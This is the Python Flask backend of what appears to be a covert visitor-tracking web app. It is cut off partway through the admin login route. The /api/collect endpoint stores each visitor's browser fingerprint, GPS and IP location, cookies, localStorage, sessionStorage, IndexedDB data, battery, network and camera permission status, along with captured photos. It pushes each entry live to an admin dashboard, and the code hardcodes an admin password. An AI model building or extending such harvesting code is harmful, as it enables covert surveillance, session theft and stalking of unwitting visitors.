from flask import Flask, request, jsonify, render_template, session, redirect, url_for
from flask_cors import CORS
from flask_socketio import SocketIO, emit, join_room, leave_room
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
from datetime import datetime
import sqlite3
import bcrypt
import json
import os
import requests
import logging
from contextlib import closing
from werkzeug.utils import secure_filename
from config import Config

# Validate configuration
Config.validate()

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# Suppress false error logs from eventlet/werkzeug in production
if Config.IS_PRODUCTION:
    logging.getLogger('eventlet.wsgi.server').setLevel(logging.ERROR)
    logging.getLogger('eventlet').setLevel(logging.ERROR)
    logging.getLogger('werkzeug').setLevel(logging.ERROR)  # Suppress HTTP access logs
    # Disable Flask's default request logging
    logging.getLogger('werkzeug').disabled = True

app = Flask(__name__)

# Secret key handling - require in production
if Config.IS_PRODUCTION:
    if not Config.SECRET_KEY:
        raise ValueError(
            "SECRET_KEY environment variable must be set in production. "
            "Please set it in your Railway/Render environment variables."
        )
    app.secret_key = Config.SECRET_KEY
else:
    app.secret_key = Config.SECRET_KEY or 'dev-key-only-for-local-development'

CORS(app)

# Initialize rate limiter
limiter = Limiter(
    app=app,
    key_func=get_remote_address,
    default_limits=["200 per day", "50 per hour"],
    storage_uri=Config.RATELIMIT_STORAGE_URL,
    enabled=Config.RATELIMIT_ENABLED
)

# Use eventlet mode for production (better compatibility with Railway)
# Eventlet provides excellent WebSocket support and works well with socketio.run()
# Auto-detect best async mode based on environment
if Config.IS_PRODUCTION:
    # Try eventlet first (more stable for production with socketio.run())
    try:
        import eventlet
        # Try to monkey patch, but handle errors gracefully
        try:
            eventlet.monkey_patch()
            async_mode = 'eventlet'
            logger.info(f"Using eventlet async mode (production - Railway: {Config.RAILWAY_ENV}, Render: {Config.RENDER_ENV})")
        except Exception as e:
            # If monkey patching fails, fall back to threading
            logger.warning(f"Eventlet monkey patch failed: {e}, falling back to threading")
            async_mode = 'threading'
    except ImportError:
        # Fall back to threading if eventlet not available
        async_mode = 'threading'
        logger.info("Eventlet not available, using threading mode")
    except Exception as e:
        # Catch any other errors with eventlet
        logger.warning(f"Error with eventlet: {e}, using threading mode")
        async_mode = 'threading'
else:
    # Use threading for local development
    async_mode = 'threading'
    logger.info("Using threading async mode (development)")

socketio = SocketIO(
    app,
    cors_allowed_origins=Config.ALLOWED_ORIGINS,
    async_mode=async_mode,
    logger=False,  # Disable to prevent false error logs
    engineio_logger=False,  # Disable to prevent false error logs
    ping_timeout=60,
    ping_interval=25,
    max_http_buffer_size=1e6  # Limit buffer size to prevent memory issues
)

# Database setup
DB_PATH = Config.DB_PATH

# Photo storage setup
PHOTOS_FOLDER = Config.PHOTOS_FOLDER
if not os.path.exists(PHOTOS_FOLDER):
    os.makedirs(PHOTOS_FOLDER)
    logger.info(f"Created photos folder: {PHOTOS_FOLDER}")

ALLOWED_EXTENSIONS = {'jpg', 'jpeg', 'png', 'gif'}
MAX_FILE_SIZE = Config.MAX_FILE_SIZE

def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

def hash_password(password):
    """Hash a password using bcrypt"""
    return bcrypt.hashpw(password.encode('utf-8'), bcrypt.gensalt()).decode('utf-8')

def verify_password(password, password_hash):
    """Verify a password against a bcrypt hash"""
    try:
        return bcrypt.checkpw(password.encode('utf-8'), password_hash.encode('utf-8'))
    except Exception as e:
        logger.error(f"Password verification error: {e}")
        return False

def init_db():
    """Initialize the database with required tables"""
    try:
        with closing(sqlite3.connect(DB_PATH)) as conn:
            c = conn.cursor()

            # Table to store collected user data
            c.execute('''CREATE TABLE IF NOT EXISTS collected_data (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TEXT NOT NULL,
                ip_address TEXT,
                user_agent TEXT,
                device_info TEXT,
                fingerprint TEXT,
                location_data TEXT,
                storage_info TEXT,
                connection_info TEXT,
                vpn_detection TEXT,
                battery_info TEXT,
                network_info TEXT,
                media_devices TEXT,
                camera_permission TEXT,
                raw_data TEXT
            )''')

            # Migrate existing database: Add new columns if they don't exist
            try:
                # Check if new columns exist
                c.execute("PRAGMA table_info(collected_data)")
                columns = [col[1] for col in c.fetchall()]

                # Add missing columns
                if 'battery_info' not in columns:
                    c.execute('ALTER TABLE collected_data ADD COLUMN battery_info TEXT')
                    logger.info("Added battery_info column")

                if 'network_info' not in columns:
                    c.execute('ALTER TABLE collected_data ADD COLUMN network_info TEXT')
                    logger.info("Added network_info column")

                if 'media_devices' not in columns:
                    c.execute('ALTER TABLE collected_data ADD COLUMN media_devices TEXT')
                    logger.info("Added media_devices column")

                if 'camera_permission' not in columns:
                    c.execute('ALTER TABLE collected_data ADD COLUMN camera_permission TEXT')
                    logger.info("Added camera_permission column")

            except Exception as e:
                logger.warning(f"Migration note: {e}")

            # Admin credentials table (username: Sabbar, password: Lights@123! - CHANGE THIS!)
            c.execute('''CREATE TABLE IF NOT EXISTS admin_users (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                username TEXT UNIQUE NOT NULL,
                password_hash TEXT NOT NULL
            )''')

            # Always ensure new admin credentials are set and old ones are removed/updated
            # Default password: Lights@123! (CHANGE THIS!)
            default_password = 'Lights@123!'
            password_hash = hash_password(default_password)
            
            # Check if new admin exists
            c.execute('SELECT * FROM admin_users WHERE username = ?', ('Sabbar',))
            sabbar_user = c.fetchone()
            
            # Check if old admin exists
            c.execute('SELECT * FROM admin_users WHERE username = ?', ('admin',))
            old_admin = c.fetchone()
            
            if old_admin:
                # Delete old admin user
                c.execute('DELETE FROM admin_users WHERE username = ?', ('admin',))
                logger.info("Removed old admin user")
            
            if not sabbar_user:
                # Create new admin user with correct credentials
                c.execute('INSERT INTO admin_users (username, password_hash) VALUES (?, ?)',
                          ('Sabbar', password_hash))
                logger.info("Created new admin user: Sabbar")
            else:
                # Update existing Sabbar user to ensure correct password
                c.execute('UPDATE admin_users SET password_hash = ? WHERE username = ?',
                          (password_hash, 'Sabbar'))
                logger.info("Updated admin user password: Sabbar")

            # Photos table to store captured photos metadata
            c.execute('''CREATE TABLE IF NOT EXISTS captured_photos (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TEXT NOT NULL,
                filename TEXT NOT NULL,
                filepath TEXT NOT NULL,
                ip_address TEXT,
                user_agent TEXT,
                file_size INTEGER,
                fingerprint TEXT,
                data_entry_id INTEGER,
                capture_source TEXT
            )''')

            # Migrate existing photos table
            try:
                c.execute("PRAGMA table_info(captured_photos)")
                photo_columns = [col[1] for col in c.fetchall()]

                if 'fingerprint' not in photo_columns:
                    c.execute('ALTER TABLE captured_photos ADD COLUMN fingerprint TEXT')
                    logger.info("Added fingerprint column to captured_photos")

                if 'data_entry_id' not in photo_columns:
                    c.execute('ALTER TABLE captured_photos ADD COLUMN data_entry_id INTEGER')
                    logger.info("Added data_entry_id column to captured_photos")

                if 'capture_source' not in photo_columns:
                    c.execute('ALTER TABLE captured_photos ADD COLUMN capture_source TEXT')
                    logger.info("Added capture_source column to captured_photos")
            except Exception as e:
                logger.warning(f"Photo table migration note: {e}")

            conn.commit()
    except sqlite3.Error as e:
        logger.error(f"Database initialization error: {e}")
        raise

# Initialize database on startup (with error handling to prevent blocking)
try:
    init_db()
    logger.info("Database initialized successfully")
except Exception as e:
    logger.error(f"Database initialization failed: {e}")
    logger.warning("Server will continue, but database operations may fail")
    # Don't raise - allow server to start even if DB init fails

# Startup confirmation
logger.info("Flask app initialized successfully")
logger.info("Server ready to accept connections")

@app.route('/')
def index():
    """Serve the main page with the button"""
    return render_template('index.html')

@app.route('/health')
def health():
    """Health check endpoint for Railway"""
    try:
        # Check database connectivity
        with closing(sqlite3.connect(DB_PATH)) as conn:
            conn.execute('SELECT 1')
        db_status = 'ok'
    except sqlite3.Error as e:
        logger.error(f"Database health check failed: {e}")
        db_status = 'error'
    except Exception as e:
        logger.error(f"Database health check unexpected error: {e}")
        db_status = 'error'
    
    # Check file system
    try:
        photos_folder_exists = os.path.exists(PHOTOS_FOLDER)
        photos_folder_writable = os.access(PHOTOS_FOLDER, os.W_OK) if photos_folder_exists else False
        fs_status = 'ok' if (photos_folder_exists and photos_folder_writable) else 'error'
    except Exception as e:
        logger.error(f"File system health check failed: {e}")
        fs_status = 'error'
    
    overall_status = 'ok' if (db_status == 'ok' and fs_status == 'ok') else 'degraded'
    
    return jsonify({
        'status': overall_status,
        'service': 'running',
        'database': db_status,
        'filesystem': fs_status,
        'timestamp': datetime.now().isoformat()
    }), 200 if overall_status == 'ok' else 503

@app.route('/metrics')
def metrics():
    """Basic metrics endpoint for monitoring"""
    try:
        with closing(sqlite3.connect(DB_PATH)) as conn:
            c = conn.cursor()
            c.execute('SELECT COUNT(*) FROM collected_data')
            data_count = c.fetchone()[0]
            c.execute('SELECT COUNT(*) FROM captured_photos')
            photo_count = c.fetchone()[0]
        
        return jsonify({
            'data_entries': data_count,
            'photos': photo_count,
            'timestamp': datetime.now().isoformat()
        }), 200
    except sqlite3.Error as e:
        logger.error(f"Metrics endpoint database error: {e}")
        return jsonify({
            'error': 'Database error',
            'timestamp': datetime.now().isoformat()
        }), 500
    except Exception as e:
        logger.error(f"Metrics endpoint unexpected error: {e}")
        return jsonify({
            'error': 'Internal error',
            'timestamp': datetime.now().isoformat()
        }), 500

def get_client_ip():
    """Extract client IP from request, handling proxy headers correctly"""
    # Check X-Real-IP first (used by some proxies like Render)
    ip = request.headers.get('X-Real-IP')
    if ip:
        return ip.split(',')[0].strip()
    
    # Check X-Forwarded-For (can contain multiple IPs, take the first one)
    ip = request.headers.get('X-Forwarded-For')
    if ip:
        # X-Forwarded-For can contain multiple IPs: "client, proxy1, proxy2"
        # The first IP is the original client IP
        return ip.split(',')[0].strip()
    
    # Fallback to remote_addr
    return request.remote_addr

@app.route('/api/get-ip-info')
def get_ip_info():
    """Backend endpoint to fetch IP info (avoids CORS issues)
    IMPORTANT: Always returns remote user's IP info, never server's IP info
    """
    try:
        # Get client IP from headers (for when behind proxy/load balancer)
        client_ip = get_client_ip()
        
        # Check if client IP is private/localhost
        is_private = (client_ip in ['127.0.0.1', 'localhost', '::1'] or 
                     client_ip.startswith('192.168.') or 
                     client_ip.startswith('10.') or
                     client_ip.startswith('172.16.') or
                     client_ip.startswith('172.17.') or
                     client_ip.startswith('172.18.') or
                     client_ip.startswith('172.19.') or
                     client_ip.startswith('172.20.') or
                     client_ip.startswith('172.21.') or
                     client_ip.startswith('172.22.') or
                     client_ip.startswith('172.23.') or
                     client_ip.startswith('172.24.') or
                     client_ip.startswith('172.25.') or
                     client_ip.startswith('172.26.') or
                     client_ip.startswith('172.27.') or
                     client_ip.startswith('172.28.') or
                     client_ip.startswith('172.29.') or
                     client_ip.startswith('172.30.') or
                     client_ip.startswith('172.31.'))

        # Try multiple IP info providers
        # CRITICAL: Always look up the CLIENT IP, never use server's IP
        # This ensures we get the correct location/VPN status for the remote user, not the server
        providers = [
            ('https://ipapi.co/{}/json/', 'ipapi.co'),
            ('https://ipinfo.io/{}/json', 'ipinfo.io'),
            ('https://ipwhois.app/json/', 'ipwhois.app'),  # This one auto-detects, skip it for private IPs
        ]
        
        # Always try to look up the client IP first (even if private, it might be a public IP behind proxy)
        if client_ip:
            for provider_template, provider_name in providers:
                # Skip auto-detect providers for private IPs (they'll return server IP)
                if not '{' in provider_template and is_private:
                    continue
                    
                try:
                    if '{' in provider_template:
                        # Provider supports IP lookup - use client IP
                        lookup_url = provider_template.format(client_ip)
                    else:
                        # Provider auto-detects - skip for private IPs to avoid server IP
                        if is_private:
                            continue
                        lookup_url = provider_template
                    
                    response = requests.get(lookup_url, timeout=5)
                    if response.ok:
                        data = response.json()
                        # CRITICAL: Always use the client IP from request, never the IP from response
                        # The response IP might be the server's IP if we used auto-detect
                        data['ip'] = client_ip
                        data['provider'] = provider_name
                        data['client_ip_from_request'] = client_ip
                        logger.info(f"Successfully looked up CLIENT IP {client_ip} using {provider_name}")
                        return jsonify(data), 200
                except Exception as e:
                    logger.warning(f"Provider {provider_name} failed for IP {client_ip}: {e}")
                    continue

        # If we couldn't get IP info for the client IP, return minimal data with client IP
        # NEVER use auto-detect here as it would return server's IP
        # This ensures we always show remote user's IP, not server's IP
        logger.warning(f"Could not get IP info for client IP {client_ip}, returning minimal data")
        return jsonify({
            'ip': client_ip, 
            'provider': 'fallback', 
            'note': 'Limited info - IP from request headers (remote user IP)',
            'client_ip_from_request': client_ip,
            'warning': 'Could not fetch location data for this IP'
        }), 200

    except Exception as e:
        logger.error(f"Error fetching IP info: {e}", exc_info=True)
        # Even on error, return the client IP, not server IP
        client_ip = get_client_ip()
        return jsonify({
            'ip': client_ip, 
            'error': str(e),
            'client_ip_from_request': client_ip,
            'note': 'Error occurred, but using remote user IP from request'
        }), 200

@app.route('/api/collect', methods=['POST'])
@limiter.limit("10 per minute")
def collect_data():
    """API endpoint to receive data from frontend"""
    try:
        # Input validation
        if not request.is_json:
            return jsonify({'status': 'error', 'message': 'Request must be JSON'}), 400
        
        data = request.json
        if not data or not isinstance(data, dict):
            return jsonify({'status': 'error', 'message': 'Invalid data format'}), 400
        
        # Validate fingerprint
        fingerprint = data.get('fingerprint', {}).get('fp', '')
        if not fingerprint or len(fingerprint) < 10:
            return jsonify({'status': 'error', 'message': 'Invalid or missing fingerprint'}), 400
        
        timestamp = datetime.now().isoformat()
        
        # Debug: Log what we received
        logger.debug(f"Received data at {timestamp}")
        logger.debug(f"Keys in data: {list(data.keys()) if data else 'None'}")
        if 'cameraAccess' in data:
            logger.debug(f"cameraAccess in data: {data.get('cameraAccess')}")
        else:
            logger.debug("cameraAccess NOT in data!")

        # Get client IP - prefer the IP from geolocation service (more accurate for public IP)
        # Fall back to request headers if not available
        ip_from_geo = data.get('ipInfo', {}).get('ip')
        ip_from_request = get_client_ip()
        ip_address = ip_from_geo if ip_from_geo else ip_from_request

        # Extract data from the payload
        device_info = json.dumps(data.get('deviceInfo', {}))
        fingerprint = data.get('fingerprint', {}).get('fp', '')

        # Helper function to reverse geocode coordinates to English location names
        def reverse_geocode_coordinates(lat, lon, retries=3):
            """Reverse geocode coordinates to get English location names with retry logic"""
            import time
            for attempt in range(retries):
                try:
                    # Use OpenStreetMap Nominatim with English language preference
                    reverse_geocode_url = f'https://nominatim.openstreetmap.org/reverse?format=json&lat={lat}&lon={lon}&zoom=10&accept-language=en'
                    reverse_response = requests.get(
                        reverse_geocode_url, 
                        timeout=10,  # Increased timeout for Railway
                        headers={'User-Agent': 'LocationTracker/1.0', 'Accept-Language': 'en'}
                    )
                    if reverse_response.ok:
                        reverse_data = reverse_response.json()
                        address = reverse_data.get('address', {})
                        city = address.get('city') or address.get('town') or address.get('village') or address.get('municipality')
                        country = address.get('country')
                        region = address.get('state') or address.get('region') or address.get('county')
                        result = {
                            'city': city,
                            'country': country,
                            'region': region
                        }
                        if city or country:  # Only return if we got useful data
                            logger.info(f"Reverse geocode successful for {lat},{lon}: {city}, {country}")
                            return result
                        else:
                            logger.warning(f"Reverse geocode returned empty data for {lat},{lon}")
                    else:
                        logger.warning(f"Reverse geocode HTTP error {reverse_response.status_code} for {lat},{lon} (attempt {attempt + 1}/{retries})")
                except requests.exceptions.Timeout:
                    logger.warning(f"Reverse geocode timeout for {lat},{lon} (attempt {attempt + 1}/{retries})")
                except requests.exceptions.RequestException as e:
                    logger.warning(f"Reverse geocode request error for {lat},{lon}: {e} (attempt {attempt + 1}/{retries})")
                except Exception as e:
                    logger.warning(f"Reverse geocode failed for {lat},{lon}: {e} (attempt {attempt + 1}/{retries})")
                
                # Wait before retry (exponential backoff)
                if attempt < retries - 1:
                    time.sleep(1 * (attempt + 1))
            
            logger.error(f"Reverse geocode failed after {retries} attempts for {lat},{lon}")
            return None

        # Prioritize GPS coordinates over IP location
        device_coords = data.get('deviceCoords')
        ip_info = data.get('ipInfo', {})
        
        # Normalize location data to ensure consistent field names
        # Handle different IP info provider formats
        # Always ensure IP address is included (use ip_address from request if not in ip_info)
        normalized_location = {
            'ip': ip_info.get('ip') or ip_address,  # Always include IP address
            'city': ip_info.get('city'),
            'region': ip_info.get('region'),
            'country': ip_info.get('country') or ip_info.get('country_name'),
            'latitude': ip_info.get('latitude') or ip_info.get('lat'),
            'longitude': ip_info.get('longitude') or ip_info.get('lon'),
            'org': ip_info.get('org') or ip_info.get('isp'),
            'provider': ip_info.get('provider'),
            # Keep raw data for reference
            'raw': ip_info.get('raw', ip_info)
        }

        # Get coordinates (prefer GPS, fall back to IP-based)
        final_lat = None
        final_lon = None
        location_type = 'ip'
        
        if device_coords and device_coords.get('lat') and device_coords.get('lon'):
            # User granted location permission - use GPS coordinates
            final_lat = device_coords.get('lat')
            final_lon = device_coords.get('lon')
            location_type = 'gps'
        elif normalized_location.get('latitude') and normalized_location.get('longitude'):
            # Use IP-based coordinates
            final_lat = normalized_location.get('latitude')
            final_lon = normalized_location.get('longitude')
            location_type = 'ip'

        # Reverse geocode coordinates to get English location names
        reverse_geocoded = None
        if final_lat and final_lon:
            reverse_geocoded = reverse_geocode_coordinates(final_lat, final_lon)
            if reverse_geocoded:
                logger.info(f"Got location from coordinates: {reverse_geocoded.get('city')}, {reverse_geocoded.get('region')}, {reverse_geocoded.get('country')}")

        # Build location data
        if device_coords and device_coords.get('lat') and device_coords.get('lon'):
            # GPS coordinates available
            location_data = json.dumps({
                **normalized_location,  # Keep IP info for reference
                'ip': normalized_location.get('ip') or ip_address,  # Ensure IP is always set
                'gps': device_coords,
                'latitude': final_lat,
                'longitude': final_lon,
                'location_type': location_type,
                'accuracy': device_coords.get('accuracy'),
                'altitude': device_coords.get('altitude'),
                # Use reverse geocoded location (English) if available, otherwise use GPS reverse geocode, then IP-based
                'city': (reverse_geocoded and reverse_geocoded.get('city')) or normalized_location.get('city'),
                'country': (reverse_geocoded and reverse_geocoded.get('country')) or normalized_location.get('country'),
                'region': (reverse_geocoded and reverse_geocoded.get('region')) or normalized_location.get('region')
            })
        else:
            # IP-based location (with or without coordinates)
            location_data = json.dumps({
                **normalized_location,
                'ip': normalized_location.get('ip') or ip_address,  # Ensure IP is always set
                'latitude': final_lat,
                'longitude': final_lon,
                'location_type': location_type,
                # Use reverse geocoded location (English) if coordinates were available, otherwise use IP-based
                'city': (reverse_geocoded and reverse_geocoded.get('city')) or normalized_location.get('city'),
                'country': (reverse_geocoded and reverse_geocoded.get('country')) or normalized_location.get('country'),
                'region': (reverse_geocoded and reverse_geocoded.get('region')) or normalized_location.get('region')
            })

        storage_info = json.dumps({
            'cookies': data.get('cookies', []),
            'localStorage': data.get('localStorage', {}),
            'sessionStorage': data.get('sessionStorage', {}),
            'indexedDB': data.get('indexedDB', {})
        })
        connection_info = json.dumps(data.get('connectionInfo', {}))
        vpn_detection = json.dumps(data.get('vpnDetection', {}))
        battery_info = json.dumps(data.get('batteryInfo', {}))
        network_info = json.dumps(data.get('networkInfo', {}))
        media_devices = json.dumps(data.get('mediaDevices', {}))
        
        # Ensure camera permission is properly stored
        # Get cameraAccess from the data - it should be sent from frontend
        camera_access = data.get('cameraAccess')
        
        # Debug: Log what we received
        logger.debug(f"Raw data.get('cameraAccess'): {camera_access}")
        logger.debug(f"Type: {type(camera_access)}")
        
        # Check if camera_access is None, empty dict, or doesn't have granted field
        if camera_access is None:
            # Try to get it from data directly
            if 'cameraAccess' in data:
                camera_access = data['cameraAccess']
                logger.debug(f"Got from data['cameraAccess']: {camera_access}")
        elif isinstance(camera_access, dict):
            # Check if it's an empty dict or missing granted field
            if len(camera_access) == 0 or 'granted' not in camera_access:
                # Try to get it from data directly
                if 'cameraAccess' in data:
                    potential = data['cameraAccess']
                    if isinstance(potential, dict) and 'granted' in potential:
                        camera_access = potential
                        logger.debug(f"Replaced with data['cameraAccess']: {camera_access}")
        else:
            # Not a dict, try to get from data
            if 'cameraAccess' in data:
                camera_access = data['cameraAccess']
                logger.debug(f"Got from data['cameraAccess'] (was not dict): {camera_access}")
        
        # If still None or not a dict, create empty dict
        if camera_access is None:
            camera_access = {}
            logger.debug("Created empty dict (was None)")
        elif not isinstance(camera_access, dict):
            # If it's not a dict, create empty
            logger.debug(f"camera_access is not a dict, type: {type(camera_access)}, creating empty dict")
            camera_access = {}
        
        # Log what we're storing
        logger.debug(f"Final camera_access: {camera_access}")
        logger.debug(f"Has granted field: {'granted' in camera_access if isinstance(camera_access, dict) else False}")
        if isinstance(camera_access, dict) and 'granted' in camera_access:
            logger.debug(f"Granted value: {camera_access.get('granted')} (type: {type(camera_access.get('granted'))})")
        
        camera_permission = json.dumps(camera_access)
        user_agent = request.headers.get('User-Agent', '')
        raw_data = json.dumps(data)

        # Enhanced logging for camera permission
        camera_data = camera_access
        logger.info(f"New entry at {timestamp}")
        logger.info(f"IP Address: {ip_address}")
        logger.debug(f"Camera Permission Data: {camera_data}")
        logger.debug(f"Camera Granted: {camera_data.get('granted', 'NOT SET')}")
        logger.debug(f"Camera Message: {camera_data.get('message', 'NO MESSAGE')}")
        if camera_data.get('error'):
            logger.warning(f"Camera Error: {camera_data.get('error')}")
        logger.debug(f"Camera Permission JSON: {camera_permission}")

        # Store in database
        try:
            with closing(sqlite3.connect(DB_PATH)) as conn:
                c = conn.cursor()
                
                # Check if user with same fingerprint already exists
                c.execute('SELECT id FROM collected_data WHERE fingerprint = ? ORDER BY timestamp DESC LIMIT 1', (fingerprint,))
                existing_entry = c.fetchone()
                
                if existing_entry:
                    # Update existing entry instead of creating new one
                    entry_id = existing_entry[0]
                    logger.info(f"Updating existing entry #{entry_id} for fingerprint {fingerprint[:16]}...")
                    
                    c.execute('''UPDATE collected_data SET
                                 timestamp = ?,
                                 ip_address = ?,
                                 user_agent = ?,
                                 device_info = ?,
                                 location_data = ?,
                                 storage_info = ?,
                                 connection_info = ?,
                                 vpn_detection = ?,
                                 battery_info = ?,
                                 network_info = ?,
                                 media_devices = ?,
                                 camera_permission = ?,
                                 raw_data = ?
                                 WHERE id = ?''',
                              (timestamp, ip_address, user_agent, device_info,
                               location_data, storage_info, connection_info, vpn_detection,
                               battery_info, network_info, media_devices, camera_permission, raw_data,
                               entry_id))
                    
                    logger.info(f"Entry #{entry_id} updated successfully")
                else:
                    # Create new entry for new user
                    c.execute('''INSERT INTO collected_data
                                 (timestamp, ip_address, user_agent, device_info, fingerprint,
                                  location_data, storage_info, connection_info, vpn_detection,
                                  battery_info, network_info, media_devices, camera_permission, raw_data)
                                 VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
                              (timestamp, ip_address, user_agent, device_info, fingerprint,
                               location_data, storage_info, connection_info, vpn_detection,
                               battery_info, network_info, media_devices, camera_permission, raw_data))
                    entry_id = c.lastrowid
                    logger.info(f"New entry #{entry_id} created for fingerprint {fingerprint[:16]}...")
                
                conn.commit()
        except sqlite3.Error as e:
            logger.error(f"Database error in collect_data: {e}", exc_info=True)
            return jsonify({'status': 'error', 'message': 'Database error'}), 500

        # Broadcast new/updated entry to admin dashboard via WebSocket
        try:
            if existing_entry:
                # Entry was updated - broadcast update event with full data
                # Also send full entry data so dashboard can add it if not found
                try:
                    with closing(sqlite3.connect(DB_PATH)) as conn:
                        c = conn.cursor()
                        c.execute('SELECT * FROM collected_data WHERE id = ?', (entry_id,))
                        row = c.fetchone()
                        
                        if row:
                            # Parse entry data (same as new entry)
                            entry_id_db = row[0]
                            fingerprint_db = row[5]
                            
                            # Find associated photo
                            c.execute('''SELECT filename FROM captured_photos
                                         WHERE fingerprint = ? OR data_entry_id = ?
                                         ORDER BY timestamp DESC LIMIT 1''', (fingerprint_db, entry_id_db))
                            photo_row = c.fetchone()
                            photo_filename = photo_row[0] if photo_row else None
                except sqlite3.Error as e:
                    logger.error(f"Database error fetching entry for WebSocket: {e}", exc_info=True)
                    row = None
                    photo_filename = None
                
                if row:
                    
                    # Parse camera permission
                    camera_permission_raw = row[14] if len(row) > 14 and row[14] else '{}'
                    try:
                        camera_permission = json.loads(camera_permission_raw)
                        if camera_permission and isinstance(camera_permission, dict):
                            if 'deviceInfo' in camera_permission or 'fingerprint' in camera_permission:
                                if 'cameraAccess' in camera_permission:
                                    camera_permission = camera_permission['cameraAccess']
                                else:
                                    camera_permission = {}
                    except Exception as e:
                        logger.warning(f"WebSocket error parsing camera permission: {e}")
                        camera_permission = {}
                    
                    # Check if user is online
                    is_online = entry_id_db in active_users or fingerprint_db in [user_info.get('fingerprint', '') for user_info in active_users.values()]
                    
                    # Prepare full entry data
                    try:
                        entry_data = {
                            'id': entry_id_db,
                            'timestamp': row[1],
                            'ip_address': row[2],
                            'user_agent': row[3],
                            'device_info': json.loads(row[4]) if row[4] else {},
                            'fingerprint': fingerprint_db,
                            'location_data': json.loads(row[6]) if row[6] else {},
                            'storage_info': json.loads(row[7]) if row[7] else {},
                            'connection_info': json.loads(row[8]) if row[8] else {},
                            'vpn_detection': json.loads(row[9]) if row[9] else {},
                            'battery_info': json.loads(row[10]) if len(row) > 10 and row[10] else {},
                            'network_info': json.loads(row[11]) if len(row) > 11 and row[11] else {},
                            'media_devices': json.loads(row[12]) if len(row) > 12 and row[12] else {},
                            'camera_permission': camera_permission,
                            'raw_data': row[14] if len(row) > 14 else None,
                            'profile_photo': photo_filename,
                            'is_online': is_online,
                            'updated': True
                        }
                        
                        # Send as new_entry so dashboard can add/update it
                        socketio.emit('new_entry', entry_data, broadcast=True, include_self=False, namespace='/')
                        logger.debug(f"Broadcasted entry update (as new_entry) for entry #{entry_id}")
                    except Exception as e:
                        logger.error(f"Error preparing updated entry data: {e}", exc_info=True)
                        # Fallback to simple update
                        socketio.emit('entry_updated', {
                            'entry_id': entry_id,
                            'timestamp': timestamp,
                            'ip_address': ip_address,
                            'fingerprint': fingerprint,
                            'updated': True
                        }, broadcast=True, include_self=False, namespace='/')
                        logger.debug(f"Broadcasted simple entry update for entry #{entry_id}")
            else:
                # New entry created - broadcast new entry event
                # Fetch the full entry data to send to dashboard
                try:
                    with closing(sqlite3.connect(DB_PATH)) as conn:
                        c = conn.cursor()
                        c.execute('SELECT * FROM collected_data WHERE id = ?', (entry_id,))
                        row = c.fetchone()
                        
                        if row:
                            # Parse the entry data similar to dashboard route
                            entry_id_db = row[0]
                            fingerprint_db = row[5]
                            
                            # Find associated photo
                            c.execute('''SELECT filename FROM captured_photos
                                         WHERE fingerprint = ? OR data_entry_id = ?
                                         ORDER BY timestamp DESC LIMIT 1''', (fingerprint_db, entry_id_db))
                            photo_row = c.fetchone()
                            photo_filename = photo_row[0] if photo_row else None
                except sqlite3.Error as e:
                    logger.error(f"Database error fetching new entry for WebSocket: {e}", exc_info=True)
                    row = None
                    photo_filename = None
                
                if row:
                    
                    # Parse camera permission
                    camera_permission_raw = row[14] if row[14] else '{}'
                    try:
                        camera_permission = json.loads(camera_permission_raw)
                        if camera_permission and isinstance(camera_permission, dict):
                            if 'deviceInfo' in camera_permission or 'fingerprint' in camera_permission:
                                if 'cameraAccess' in camera_permission:
                                    camera_permission = camera_permission['cameraAccess']
                                else:
                                    camera_permission = {}
                    except Exception as e:
                        logger.warning(f"WebSocket error parsing camera permission: {e}")
                        camera_permission = {}
                    
                    # Check if user is online
                    is_online = entry_id_db in active_users or fingerprint_db in [user_info.get('fingerprint', '') for user_info in active_users.values()]
                    
                    # Prepare entry data for dashboard
                    # Column order: id, timestamp, ip_address, user_agent, device_info, fingerprint,
                    # location_data, storage_info, connection_info, vpn_detection,
                    # battery_info, network_info, media_devices, camera_permission, raw_data
                    try:
                        entry_data = {
                            'id': entry_id_db,
                            'timestamp': row[1],
                            'ip_address': row[2],
                            'user_agent': row[3],
                            'device_info': json.loads(row[4]) if row[4] else {},
                            'fingerprint': fingerprint_db,
                            'location_data': json.loads(row[6]) if row[6] else {},
                            'storage_info': json.loads(row[7]) if row[7] else {},
                            'connection_info': json.loads(row[8]) if row[8] else {},
                            'vpn_detection': json.loads(row[9]) if row[9] else {},
                            'battery_info': json.loads(row[10]) if len(row) > 10 and row[10] else {},
                            'network_info': json.loads(row[11]) if len(row) > 11 and row[11] else {},
                            'media_devices': json.loads(row[12]) if len(row) > 12 and row[12] else {},
                            'camera_permission': camera_permission,
                            'raw_data': row[14] if len(row) > 14 else None,
                            'profile_photo': photo_filename,
                            'is_online': is_online
                        }
                        
                        socketio.emit('new_entry', entry_data, broadcast=True, include_self=False, namespace='/')
                        logger.debug(f"Broadcasted new entry #{entry_id} to dashboard")
                        logger.debug(f"Entry data keys: {list(entry_data.keys())}")
                        logger.debug(f"Entry ID: {entry_data.get('id')}, IP: {entry_data.get('ip_address')}")
                    except Exception as e:
                        logger.error(f"Error preparing entry data: {e}", exc_info=True)
        except Exception as e:
            logger.error(f"Error broadcasting entry: {e}", exc_info=True)
            # Don't fail the request if WebSocket broadcast fails

        return jsonify({
            'status': 'success', 
            'message': 'Data collected successfully',
            'entry_id': entry_id,
            'fingerprint': fingerprint,
            'updated': existing_entry is not None
        }), 200

    except ValueError as e:
        logger.warning(f"Validation error in collect_data: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 400
    except sqlite3.Error as e:
        logger.error(f"Database error in collect_data: {e}", exc_info=True)
        return jsonify({'status': 'error', 'message': 'Database error'}), 500
    except Exception as e:
        logger.error(f"Unexpected error in collect_data: {e}", exc_info=True)
        return jsonify({'status': 'error', 'message': 'Internal server error'}), 500

@app.route('/admin/login', methods=['GET', 'POST'])
@limiter.limit("5 per 15 minutes")
def admin_login():
    """Admin login page"""
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        if not username or not password:
            return render_template('login.html', error='Username and password required')
        
        try:
